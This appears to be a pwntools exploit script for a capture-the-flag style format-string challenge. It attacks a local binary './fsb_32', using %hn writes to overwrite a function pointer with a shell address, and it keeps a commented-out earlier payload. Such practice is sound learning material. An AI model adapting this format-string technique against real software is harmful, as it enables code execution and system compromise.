from pwn import *

p = process("./fsb_32")

func = 0x8049a90
shell = 0x08048576

p.recvuntil("addr is : ")
addr = int(p.recvline()[:-1],16)

log.info(hex(addr))

# payload =  "%34153c "
# payload += p32(func)
# payload += "%x%hn   "
# payload += "%33388c "
# payload += p32(func+2)
# payload += "%x%x%x  "
# payload += "%hn     "

payload =  "%34161c "
payload += p32(func)
payload += "%3$hn   "
payload += "%33414c "
payload += p32(func+2)
payload += "%8$hn   "




pause()
p.sendlineafter("fsb now!>>",payload)

p.interactive()